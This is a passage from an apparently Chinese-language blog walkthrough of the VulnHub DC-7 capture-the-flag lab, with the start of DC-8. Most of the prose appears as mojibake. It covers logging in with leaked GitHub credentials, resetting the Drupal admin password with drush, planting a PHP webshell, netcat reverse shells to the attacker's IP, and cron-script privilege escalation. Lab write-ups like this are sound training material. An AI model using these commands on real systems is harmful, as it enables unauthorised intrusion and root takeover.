<p>æ‰€ä»¥æˆ‘ä»¬ç”¨<code>bing</code>æŸ¥ä¸€ä¸‹ã€å›½å†…æœç´¢å¼•æ“å¾ˆéš¾æœåˆ°ï¼Œè°·æ­Œè¦é­”æ³•ï¼Œæˆ‘å†™è¿™<code>DC7</code>è¿™å‡ å¤©ä¸æ–¹ä¾¿é­”æ³•ï¼Œæ‰€ä»¥<code>bing</code>æœ€å¥½ã€‘</p>
<p>è¿˜çœŸæ‰¾åˆ°äº†</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/Dc7User/</span>staffdb<span class="regexp">/blob/m</span>aster/config.php</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221018201258802.png" alt="image-20221018201258802"></p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">|<span class="string"> &lt;?php </span>|<span class="string">                                                              </span>|</span><br><span class="line">|<span class="string"> ----- </span>|<span class="string"> ------------------------------------------------------------ </span>|</span><br><span class="line">|<span class="string">       </span>|<span class="string"> $servername = &quot;localhost&quot;;                                   </span>|</span><br><span class="line">|<span class="string">       </span>|<span class="string"> $username = &quot;dc7user&quot;;                                       </span>|</span><br><span class="line">|<span class="string">       </span>|<span class="string"> $password = &quot;MdR3xOgB7#dW&quot;;                                  </span>|</span><br><span class="line">|<span class="string">       </span>|<span class="string"> $dbname = &quot;Staff&quot;;                                           </span>|</span><br><span class="line">|<span class="string">       </span>|<span class="string"> $conn = mysqli_connect($servername, $username, $password, $dbname); </span>|</span><br><span class="line">|<span class="string">       </span>|<span class="string"> ?&gt;                                                           </span>|</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°è´¦å·å’Œå¯†ç ï¼Œä»¥åŠæ•°æ®åº“çš„åå­—ï¼Œçœ‹æ¥æˆ‘ä»¬ç¡®å®è·³å‡ºäº†æ¡†æ¶</p>
<p>æˆ‘ä»¬åˆ©ç”¨è´¦å·å¯†ç åœ¨æˆ‘ä»¬ä¹‹å‰çš„ç½‘ç«™ç™»å½•ä¸€ä¸‹è¯•è¯•</p>
<blockquote>
<p>$username &#x3D; â€œ<code>dc7user</code>â€œ;<br>$password &#x3D; â€œ<code>MdR3xOgB7#dW</code>â€œ;  </p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221018201801467.png" alt="image-20221018201801467"></p>
<p>ç»“æœæŠ¥é”™ï¼Œçœ‹æ¥è¿™ä¸ªè´¦å·å¹¶ä¸æ˜¯åœ¨è¿™ä¸ªé¡µé¢ç™»å½•çš„</p>
<h2><span id="2sshç™»å½•">2.sshç™»å½•</span></h2><p>æˆ‘ä»¬æ ¹æ®ä¹‹å‰å¾—åˆ°çš„ä¿¡æ¯çŸ¥é“ï¼Œ<code>22</code>ç«¯å£è¿è¡Œç€<code>ssh</code>ï¼Œæˆ‘ä»¬ç”¨å…¶ç™»å½•è¯•è¯•</p>
<blockquote>
<p>$username &#x3D; â€œ<code>dc7user</code>â€œ;<br>$password &#x3D; â€œ<code>MdR3xOgB7#dW</code>â€œ;  </p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221018202130724.png" alt="image-20221018202130724"></p>
<p>å¥½å®¶ä¼™ï¼Œæœç„¶æ˜¯<code>ssh</code>çš„è´¦å·å¯†ç </p>
<p>æˆ‘ä»¬æ¥æ‰¾æ‰¾æœ‰æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¸œè¥¿</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221018202308173.png" alt="image-20221018202308173"></p>
<p>æˆ‘ä»¬å…ˆæ‰“å¼€<code>backups</code>æ–‡ä»¶å¤¹</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221018202658047.png" alt="image-20221018202658047"></p>
<p>å‘ç°æ˜¯ä¸¤ä¸ª<code>.gpg</code>æ–‡ä»¶</p>
<blockquote>
<p><code>gpg</code>æ–‡ä»¶<br>å°±æ˜¯ä¸€ä¸ªåŠ å¯†æ–‡ä»¶</p>
</blockquote>
<p>è€Œæˆ‘ä»¬ç°åœ¨æ²¡æœ‰ä¿¡æ¯å’Œå¯†ç ï¼Œæ‰€ä»¥æˆ‘ä»¬å†çœ‹çœ‹å¦ä¸€ä¸ªæ–‡ä»¶</p>
<blockquote>
<p>è¿”å›ä¸Šçº§ç›®å½•<br><code>cat mbox</code> </p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221018203146128.png" alt="image-20221018203146128"></p>
<p>å‘ç°æ˜¯<code>root</code>ç”¨æˆ·å‘½ä»¤æ‰§è¡Œçš„è®°å½•</p>
<p>å‘ç°äº†</p>
<blockquote>
<p><code>Database dump saved to /home/dc7user/backups/website.sql</code><br>&#x2F;&#x2F;æ•°æ®åº“ä¿¡æ¯å­˜å…¥website.sqlæ–‡ä»¶<br>&#x2F;&#x2F;ç„¶årootæ‰§è¡Œäº†åŠ å¯†è„šæœ¬åŠ å¯†æ•°æ®åº“æ–‡ä»¶</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221018203403493.png" alt="image-20221018203403493"></p>
<h3><span id="å®šæ—¶ä»»åŠ¡croncrond">*å®šæ—¶ä»»åŠ¡ã€cronï¼ˆcrondï¼‰ã€‘</span></h3><p>æˆ‘ä»¬å‘ç°åœ¨<code>root</code>ç”¨æˆ·æ‰§è¡ŒåŠ å¯†è„šæœ¬ä¹‹å‰æœ‰ä¸€ä¸ª<code>Cron</code></p>
<blockquote>
<p><code>Cron</code>å‘ç°æ˜¯å®šæ—¶ä»»åŠ¡ï¼Œä»£è¡¨è¿‡ä¸€æ®µæ—¶é—´å°±æ‰§è¡Œä¸€æ¬¡ï¼Œä»¥æ¥æ›´æ–°æ•°æ®åº“å¤‡ä»½æ–‡ä»¶ã€<code>backups</code>ã€‘</p>
<p>è¿™æ˜¯ä¸ªå®šæ—¶ä»»åŠ¡ ç”¨<code>root</code> è¿è¡Œ<code>/opt/scripts/backups.sh</code></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221018203434313.png" alt="image-20221018203434313"></p>
<h3><span id="å…³é”®æ€è·¯">*å…³é”®æ€è·¯</span></h3><p>æŸ¥çœ‹ä¸‹æƒé™ä»€ä¹ˆçš„ï¼Œå‘ç°<code>www-data</code>æ‹¥æœ‰æ‰§è¡Œå’Œå†™çš„æƒé™ï¼Œæˆ‘ä»¬å½“å‰æƒé™æ²¡æœ‰å†™æƒé™ï¼Œçœ‹æ¥æ²¡åŠæ³•åŠ¨æ‰‹è„šäº†ã€‚</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221018234503615.png" alt="image-20221018234503615"></p>
<h3><span id></span></h3><p>ä½†æ˜¯å¦‚æœæˆ‘ä»¬è·å¾—äº†<code>www-data</code>çš„<code>shell</code> é‚£å°±å¯ä»¥å†™ç‚¹ä¸œè¥¿è¿›å»ï¼Œç„¶åä¾é <strong>è®¡åˆ’ä»»åŠ¡</strong>ï¼Œç”¨<code>root</code>å»è¿è¡Œï¼Œç„¶ååå¼¹<code>shell</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è·å¾—äº†<code>root</code>æƒé™çš„<code>shell</code>äº†ã€‚</p>
<h2><span id="3drushå‘½ä»¤å¯¹drupalä¿®æ”¹ç”¨æˆ·åå’Œå¯†ç ">3.<code>drush</code>å‘½ä»¤å¯¹<code>drupal</code>ä¿®æ”¹ç”¨æˆ·åå’Œå¯†ç </span></h2><p>æˆ‘ä»¬æŒ‰è·¯å¾„æŸ¥çœ‹è¯¥è„šæœ¬å†…å®¹</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221018203742731.png" alt="image-20221018203742731"></p>
<p>æˆ‘ä»¬å‘ç°æœç„¶æ˜¯ä¸ªåŠ å¯†æ•°æ®åº“æ–‡ä»¶çš„è„šæœ¬ï¼Œä½†æ˜¯æˆ‘ä»¬ä»ç„¶ä¸çŸ¥é“å¯†ç </p>
<p>ä½†æ˜¯æˆ‘ä»¬å‘ç°äº†æ•°æ®åº“æ–‡ä»¶ä¼¼ä¹è¢«æ›´æ”¹è¿‡</p>
<p>å‡ºç°äº†ä¸€ä¸ªæ–°çš„å‘½ä»¤</p>
<blockquote>
<p><code>drush</code><br>&#x2F;&#x2F;drushå‘½ä»¤æ˜¯åœ¨drupalæ¡†æ¶ä¸­è¿›è¡Œé…ç½®çš„å‘½ä»¤ï¼Œå¯ä»¥ä¿®æ”¹ç”¨æˆ·åå’Œå¯†ç ï¼Œ<br>&#x2F;&#x2F;ä½†æ˜¯drushå¿…é¡»åœ¨drupalå®‰è£…ç›®å½•ä¸‹è¿›è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æŒ‰è„šæœ¬ç»™çš„<br><code>cd /var/www/html/</code></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221018204531647.png" alt="image-20221018204531647"></p>
<blockquote>
<p><code>cd /var/www/html</code><br><code>drush user-password admin:123456</code><br>&#x2F;&#x2F;ç”¨æˆ·å<code>admin</code>å’Œå¯†ç <code>123456</code></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221018205540723.png" alt="image-20221018205540723"></p>
<p>ç„¶åæˆåŠŸä¿®æ”¹ç”¨æˆ·<code>admin</code>çš„å¯†ç ä¸º<code>123456</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221018212431462.png" alt="image-20221018212431462"></p>
<h2><span id="4ç™»å½•ç½‘ç«™">4.ç™»å½•ç½‘ç«™</span></h2><p>å½“æˆ‘ä»¬è¾“å…¥æˆ‘ä»¬ä¿®æ”¹åçš„å¯†ç åï¼ŒæˆåŠŸç™»å½•<code>admin</code>ç”¨æˆ·</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221018212905392.png" alt="image-20221018212905392"></p>
<p>ç„¶åæˆ‘ä»¬ç»Ÿåˆä¸€ä¸‹æ€è·¯ï¼Œæˆ‘ä»¬è¿›å…¥äº†ç½‘ç«™åï¼Œåº”è¯¥å¦‚ä½•æ‹¿åˆ°<code>shell</code>ï¼Œé‚£è‚¯å®šéœ€è¦å†™æœ¨é©¬æˆ–è€…åå¼¹<code>shell</code></p>
<p>é‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦æ‰¾åˆ°å¯ä»¥ä¿®æ”¹å¹¶å¢åŠ <code>php</code>æ–‡ä»¶çš„çš„åœ°æ–¹</p>
<p>æˆ‘ä»¬å…ˆæ‰“å¼€<code>content</code>é¡µé¢ï¼Œå‘ç°æœ‰<code>å¼€å§‹.html</code>é¡µé¢</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221018212952593.png" alt="image-20221018212952593"></p>
<p>ç‚¹å¼€æŸ¥çœ‹</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221018215114742.png" alt="image-20221018215114742"></p>
<p>å‘ç°å¯ä»¥ä¿®æ”¹å†…å®¹ï¼Œçœ‹æ¥æˆ‘ä»¬å¯ä»¥è¯•è¯•ä¿®æ”¹å®ƒï¼Œå˜æˆæˆ‘ä»¬çš„æœ¨é©¬æ–‡ä»¶</p>
<p>ç»“æœå‘ç°æ–‡ä»¶åªèƒ½ä»¥<code>html</code>å½¢å¼æ‰§è¡Œï¼Œè€Œä¸èƒ½ä»¥<code>php</code>å½¢å¼æ‰§è¡Œ</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221018215830844.png" alt="image-20221018215830844"></p>
<h3><span id="æ·»åŠ phpæ‰§è¡Œæ’ä»¶">æ·»åŠ phpæ‰§è¡Œæ’ä»¶</span></h3><p><code>drupal</code>æ¡†æ¶å¯ä»¥æ·»åŠ <code>php</code>æ–‡ä»¶æ’ä»¶ï¼Œä»è€Œèƒ½ä¿®æ”¹ä¸º<code>php</code>æ–‡ä»¶</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221018220115382.png" alt="image-20221018220115382"></p>
<p>ç‚¹å‡»</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">install <span class="keyword">new</span> <span class="keyword">module</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221018220912473.png" alt="image-20221018220912473"></p>
<p>åœ¨<code>url</code>é‡Œå¡«å†™</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>ftp.drupal.org<span class="regexp">/files/</span>projects/php-<span class="number">8</span>.x-<span class="number">1</span>.x-dev.tar.gz</span><br></pre></td></tr></table></figure>

<p>ç„¶å<code>install</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221018221952909.png" alt="image-20221018221952909"></p>
<p>ä½†æ˜¯æˆ‘è¿™é‡Œæ˜¾ç¤ºæ— æ³•è¿æ¥ç½‘ç«™ï¼Œé‚£æˆ‘ä»¬ç›´æ¥ä¸Šä¼ æ’ä»¶æ–‡ä»¶ä¹Ÿæ˜¯å¯ä»¥çš„</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221018222047051.png" alt="image-20221018222047051"></p>
<p>ç„¶åæ·»åŠ æˆåŠŸ</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221018222109470.png" alt="image-20221018222109470"></p>
<p>ç„¶ååœ¨<code>FILTERS</code>å¤„</p>
<p>å¯åŠ¨æ’ä»¶ã€å‹¾é€‰ã€‘</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221018222451086.png" alt="image-20221018222451086"></p>
<p>æœ€åè®°å¾—è¿˜è¦<code>install</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221018222512620.png" alt="image-20221018222512620"></p>
<p>ç„¶åæˆ‘ä»¬çš„æ–‡ä»¶å°±å¯ä»¥ä»¥<code>php</code>æ–‡ä»¶å½¢å¼æ‰§è¡Œäº†</p>
<h3><span id="åŠ å…¥ä¸€å¥è¯æœ¨é©¬">åŠ å…¥ä¸€å¥è¯æœ¨é©¬</span></h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221018232816262.png" alt="image-20221018232816262"></p>
<p>ã€è®°ä½<code>Text foromat</code>è¦æ”¹æˆ<code>PHP code</code>ã€‘</p>
<p>ç„¶åä¿å­˜å³å¯</p>
<h2><span id="5èšå‰‘è¿æ¥getshell">5.èšå‰‘è¿æ¥getshell</span></h2><p>å› ä¸ºæˆ‘ä»¬æ˜¯åœ¨<code>welcome</code>é¡µé¢é‡Œæ’å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œæ‰€ä»¥ç›´æ¥è¿æ¥é¶æœºipå°±è¡Œ</p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168.133.146</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221018232842168.png" alt="image-20221018232842168"></p>
<p>è¿æ¥æˆåŠŸ</p>
<p>å¯åŠ¨è™šæ‹Ÿç»ˆç«¯</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221018232923762.png" alt="image-20221018232923762"></p>
<p><code>getshell</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221018233020910.png" alt="image-20221018233020910"></p>
<h2><span id="6åå¼¹shellæ‹¿www-data">6.åå¼¹shellæ‹¿www-data</span></h2><p>æˆ‘ä»¬å…ˆå¼€å§‹ç›‘å¬<code>9999</code>ç«¯å£</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvvp <span class="number">9999</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221018233321886.png" alt="image-20221018233321886"></p>
<p>æˆ‘ä»¬åœ¨èšå‰‘çš„<code>shell</code>ä¸Š</p>
<p>å¼€å§‹åå¼¹<code>shell</code></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> -e /bin/bash <span class="number">192.168.133.140</span> <span class="number">9999</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221018233814670.png" alt="image-20221018233814670"></p>
<p>ç„¶åæ‹¿åˆ°åå¼¹<code>shell</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221018233713840.png" alt="image-20221018233713840"></p>
<p>è¿›å…¥äº¤äº’å¼shell</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -<span class="keyword">c</span> <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221018234804275.png" alt="image-20221018234804275"></p>
<h2><span id="7åˆ©ç”¨å®šæ—¶ä»»åŠ¡cronææƒroot">7.åˆ©ç”¨å®šæ—¶ä»»åŠ¡ã€cronã€‘ææƒ<code>root</code></span></h2><p>æˆ‘ä»¬å‘ <code>backups.sh</code>å†™å…¥åå¼¹<code>shell</code>å‘½ä»¤</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;nc 192.168.133.140 12345 -e /bin/bash&quot;</span> &gt;&gt; /<span class="keyword">opt</span>/scripts/backups.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221018235007598.png" alt="image-20221018235007598"></p>
<p>ç„¶åæˆ‘ä»¬å†å¼€ä¸€ä¸ªæ§åˆ¶å°å¼€å§‹ç›‘å¬<code>12345</code>ç«¯å£</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221018235124023.png" alt="image-20221018235124023"></p>
<p>ç„¶åæˆ‘ä»¬ç­‰å¾…å®šæ—¶ä»»åŠ¡æ‰§è¡Œï¼Œä¾¿å¯ä»¥æ‹¿åˆ°<code>shell</code>ã€æ—¶é—´æœ‰ç‚¹ä¹…ã€‘</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221019000112748.png" alt="image-20221019000112748"></p>
<p>è¿æ¥æˆåŠŸåï¼Œåˆ°<code>root</code>ç›®å½•æŸ¥çœ‹<code>flag</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221019123852041.png" alt="image-20221019123852041"></p>
<blockquote>
<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">888      <span class="number"> 888 </span>        <span class="number"> 888 </span>888      8888888b.                            <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888   o  <span class="number"> 888 </span>        <span class="number"> 888 </span>888     <span class="number"> 888 </span> &quot;Y88b                           <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888  d8b <span class="number"> 888 </span>        <span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span>                          <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888 d888b<span class="number"> 888 </span> .d88b. <span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span> .d88b.  88888b.   .d88b. <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888d88888b888 d8P  Y8b<span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span>d88&quot;&quot;88b<span class="number"> 888 </span>&quot;88b d8P  Y8b<span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">88888P Y88888<span class="number"> 88888888 </span>888<span class="number"> 888 </span>    <span class="number"> 888 </span>  <span class="number"> 888 </span>888 <span class="number"> 888 </span>888 <span class="number"> 888 </span>88888888 Y8P Y8P Y8P Y8P </span><br><span class="line">8888P   Y8888 Y8b.    <span class="number"> 888 </span>888     <span class="number"> 888 </span> .d88P Y88..88P<span class="number"> 888 </span><span class="number"> 888 </span>Y8b.      &quot;   &quot;   &quot;   &quot;  </span><br><span class="line">888P     Y888  &quot;Y8888 <span class="number"> 888 </span>888      8888888P&quot;   &quot;Y88P&quot; <span class="number"> 888 </span><span class="number"> 888 </span> &quot;Y8888 <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br></pre></td></tr></table></figure>


<p><code>Congratulations!!!</code></p>
<p><code>Hope you enjoyed DC-7.  Just wanted to send a big thanks out there to all those</code><br><code>who have provided feedback, and all those who have taken the time to complete these little</code><br><code>challenges.</code></p>
<p><code>I&#39;m sending out an especially big thanks to:</code></p>
<p><code>@4nqr34z</code><br><code>@D4mianWayne</code><br><code>@0xmzfr</code><br><code>@theart42</code></p>
<p><code>If you enjoyed this CTF, send me a tweet via @DCAU7.</code></p>
<p>æ„æ€æ˜¯ï¼š<br>æ­å–œï¼ï¼ï¼</p>
<p>å¸Œæœ›ä½ å–œæ¬¢ DC-7ã€‚åªæ˜¯æƒ³å‘æ‰€æœ‰è¿™äº›äººè¡¨ç¤ºè¡·å¿ƒçš„æ„Ÿè°¢<br>æä¾›åé¦ˆçš„äººï¼Œä»¥åŠæ‰€æœ‰èŠ±æ—¶é—´å®Œæˆè¿™äº›å°äº‹çš„äºº<br>æŒ‘æˆ˜ã€‚</p>
<p>æˆ‘è¦ç‰¹åˆ«æ„Ÿè°¢ï¼š</p>
<p>@4nqr34z<br>@D4mianWayne<br>@0xmzfr<br>@å¿ƒ42</p>
<p>å¦‚æœä½ å–œæ¬¢è¿™ä¸ª CTFï¼Œè¯·é€šè¿‡@DCAU7 ç»™æˆ‘å‘ä¸€æ¡æ¨æ–‡</p>
</blockquote>
<p><strong>ä¸€ä¸ªæ——å­æ‰¾å®Œï¼Œæ¸¸æˆç»“æŸ</strong></p>
<h1><span id="å…«-dc8åˆçº§">å…«ã€DC8[åˆçº§]</span></h1><p><strong>only one flag</strong></p>
<blockquote>
<p><code>hint:</code><br><code>This challenge is a bit of a hybrid between being an actual challenge, and being a &quot;proof of concept&quot; as to whether two-factor authentication installed and configured on Linux can prevent the Linux server from being exploited.</code></p>
<p><code>The &quot;proof of concept&quot; portion of this challenge eventuated as a result of a question being asked about two-factor authentication and Linux on Twitter, and also due to a suggestion by @theart42.</code></p>
<p><code>The ultimate goal of this challenge is to bypass two-factor authentication, get root and to read the one and only flag.</code></p>
<p><code>You probably wouldn&#39;t even know that two-factor authentication was installed and configured unless you attempt to login via SSH, but it&#39;s definitely there and doing it&#39;s job.</code></p>
<p>æ„æ€æ˜¯ï¼š<br>è¿™ä¸ªæŒ‘æˆ˜æœ‰ç‚¹æ··åˆå®é™…æŒ‘æˆ˜å’Œâ€œæ¦‚å¿µè¯æ˜â€ï¼Œå³åœ¨ Linux ä¸Šå®‰è£…å’Œé…ç½®çš„åŒå› ç´ èº«ä»½éªŒè¯æ˜¯å¦å¯ä»¥é˜²æ­¢ Linux æœåŠ¡å™¨è¢«åˆ©ç”¨ã€‚</p>
<p>è¿™ä¸ªæŒ‘æˆ˜çš„â€œæ¦‚å¿µè¯æ˜â€éƒ¨åˆ†æœ€ç»ˆæ˜¯ç”±äº Twitter ä¸Šå…³äºåŒå› ç´ èº«ä»½éªŒè¯å’Œ Linux çš„é—®é¢˜ï¼Œä»¥åŠ@theart42 çš„å»ºè®®ã€‚</p>
<p>æ­¤æŒ‘æˆ˜çš„æœ€ç»ˆç›®æ ‡æ˜¯ç»•è¿‡åŒé‡èº«ä»½éªŒè¯ï¼Œè·å– root æƒé™å¹¶è¯»å–å”¯ä¸€æ ‡å¿—ã€‚</p>
<p>é™¤éæ‚¨å°è¯•é€šè¿‡ SSH ç™»å½•ï¼Œå¦åˆ™æ‚¨å¯èƒ½ç”šè‡³ä¸çŸ¥é“å·²å®‰è£…å’Œé…ç½®äº†åŒå› ç´ èº«ä»½éªŒè¯ï¼Œä½†å®ƒè‚¯å®šå­˜åœ¨å¹¶ä¸”å¯ä»¥æ­£å¸¸å·¥ä½œã€‚</p>
</blockquote>
<h2><span id="ä¿¡æ¯æ”¶é›†">ä¿¡æ¯æ”¶é›†</span></h2><p> å…ˆ<code>nmap</code>æ‰«ä¸€ä¸‹</p>
